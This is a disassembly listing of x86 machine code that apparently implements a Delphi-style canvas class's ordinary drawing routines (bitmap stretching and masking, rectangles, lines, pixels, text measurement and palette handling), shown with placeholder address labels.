pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_42482c
xor eax eax
push ebp
push sub_4245fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424bf4
mov eax [ ebp - 0x8 ]
call sub_4277e0
call sub_42482c
xor eax eax
push ebp
push sub_4245d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov edi [ ebx + 0x8 ]
sub edi [ ebx ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
call sub_4278cc
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
call sub_427a40
mov eax [ ebp - 0x24 ]
call sub_4277e0
mov dl [ r-xdata ]
call sub_424bf4
mov eax [ ebp - 0x24 ]
call sub_4277e0
mov eax [ eax + 0x4 ]
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov [ ebp - 0x28 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
mov [ ebp - 0x28 ] eax
jmp r-xdata
push 0xcc0020
mov eax [ ebp - 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4277e0
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBkColor
mov [ ebp - 0x18 ] eax
push 0xe20746
mov eax [ ebp - 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetTextColor
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBkColor
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4277e0
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4250b0
jmp r-xdata
xor eax eax
push ebp
push sub_4245b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4277e0
mov dl [ r-xdata ]
call sub_424bf4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4241f8
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
call sub_403270
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4245ba
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
retn
sub_424614
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424bf4
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_42469c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
mov eax [ ebx + 0x14 ]
call sub_4240dc
call sub_423458
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423458
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_416f14
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_424748
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
push esi
mov eax [ ebx + 0x4 ]
push eax
call DrawFocusRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_42477c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
mov eax [ ebx + 0x14 ]
call sub_424118
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4247b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
mov eax [ ebx + 0x14 ]
call sub_424118
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4247f4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_424854
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_424880
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4248b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_424900
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_42493c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4042a8
push eax
mov eax edi
call sub_4044a8
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_424980
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_42493c
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_42499c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_42493c
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4249bc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_424a08
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a0f
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_42482c
sub_424a68
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_424a8c
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_424854
pop ecx
pop edx
pop edi
pop esi
retn
sub_424aac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_424ad8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424bf4
mov eax [ ebp + 0x8 ]
call sub_423458
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_424b40
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_424ba0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_424b40
mov edx esp
mov eax ebx
call sub_424a68
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_424a8c
sub_424bf4
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_424c90
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
test bl 0x8
je r-xdata
mov eax esi
call sub_424cbc
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_424cec
sub_424c90
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_42392c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423458
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_424cbc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_423e2c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_424cec
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_424118
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_424118
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_4241f8
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_4240dc
call sub_423458
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_4240dc
call sub_423458
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_424e10
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_424e5a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e61
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_424e64
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_424f00
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_424e10
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404258
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f07
lea eax [ ebp - 0x104 ]
call sub_403fe8
retn
sub_424f1c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_42506a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_424fd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_424e64
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_424e64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425071
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_42507c
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_4250b0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_424f0c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_425330
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424f0c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425337
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424f0c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_425183
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406bec
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425337
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_425344
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_42537c
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402c84
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_4253f4
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_42544c
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028f0
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425549
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425550
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_425564
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4255ea
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
